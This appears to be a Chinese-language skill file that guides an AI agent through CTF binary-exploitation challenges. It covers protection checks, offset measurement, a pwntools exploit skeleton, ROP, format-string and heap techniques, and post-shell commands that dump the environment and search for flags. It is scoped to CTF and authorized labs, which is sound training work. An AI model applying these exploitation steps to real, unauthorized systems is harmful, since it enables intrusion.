---
name: ctf-pwn
description: CTF Pwn/二进制利用方向自主解题：checksec 保护分析、栈溢出与格式化字符串、ROP/ret2libc/ret2csu、堆利用、shellcode、偏移实测与 exp 编写，直到拿到 shell 读出 flag。适用于 Pwn 题与授权二进制利用。
license: MIT
compatibility: 仅限 CTF / 靶场 / 授权环境
---

# CTF Pwn 自主解题

## 1. 拿到二进制先做四件事

```bash
cd /app/data/tasks/TID/ && mkdir -p pwn && cd pwn
file ./chall
checksec --file=./chall 2>/dev/null || { readelf -hW ./chall | head -12; readelf -lW ./chall | grep -E 'GNU_STACK|GNU_RELRO'; }
strings -a ./chall | head -50
nm -D ./chall 2>/dev/null | head -30
objdump -d ./chall | grep -E '<(main|win|system|gets|read|printf)>:'
```

| 保护 | 含义 | 利用影响 |
|---|---|---|
| Canary | 栈上随机值，返回前校验 | 需先泄漏 canary，或改走格式化字符串 / 堆 |
| NX | 栈不可执行 | 不能上栈执行 shellcode，改 ROP |
| PIE | 程序基址随机 | 先泄漏程序基址，或用 partial overwrite |
| RELRO | GOT 保护 | Full RELRO 不能改 GOT |
| ASLR | 系统级随机 | 需泄漏 libc / 程序地址 |

## 2. 栈溢出标准流程

```bash
# 1) 确认溢出
python3 -c "print('A'*300)" | ./chall; echo "exit=$?"
# 2) 实测偏移（禁止背公式猜）
gdb -q -batch -ex run -ex 'info registers rip' --args ./chall < <(python3 -c "print('A'*300)")
```

exp 骨架（pwntools）：

```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')
elf  = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)
io = remote('TARGET', 1337) if args.REMOTE else process('./chall')
# ret2win:  io.sendline(b'A'*OFFSET + p64(elf.sym['win']))
# ret2libc: 泄漏 -> libc base -> system('/bin/sh')
io.interactive()
```

**偏移必须实测**（cyclic），公式值只作参考。

## 3. 常见方向与触发点

| 漏洞 | 识别证据 | 打法 |
|---|---|---|
| ret2win | 有 `win()`/`system` 且 No PIE | 覆盖返回地址直接跳 |
| ret2libc | NX 开、可泄漏 | `puts@got` 泄漏 → libc base → `system("/bin/sh")` |
| ret2csu / 缺 gadget | 没有 `pop rdi` | 用 `__libc_csu_init` gadget 链 |
| 格式化字符串 | `printf(buf)` 无参 | `%N$p` 找栈偏移，任意写 GOT |
| 堆 UAF/Double Free | `free` 后未置空 | tcache / fastbin poisoning |
| 整数溢出 | 大小计算可绕过 | 触发负长度 / 二次分配 |
| Shellcode | NX 关 | `shellcraft.sh()` |

```bash
ROPgadget --binary ./chall | grep -E 'pop rdi|pop rsi|syscall|/bin/sh'
one_gadget ./libc.so.6 2>/dev/null
```

## 4. 拿 shell 之后

```bash
cat /flag*; cat /home/*/flag*; env; find / -name 'flag*' -maxdepth 3 2>/dev/null
```

`report_finding` 必须附：偏移实测输出、leak 原始值、最终 exp、`cat flag` 原始回显。

## 5. 纪律

- 本地先打通（`process()`）再打远程（`remote()`），不要远程盲试。
- 每次失败保留 core / gdb 输出——那是唯一能告诉你 RIP 偏移的证据。
- 远程连不上先 `nc -vz HOST PORT` 确认端口，再怀疑 exp。
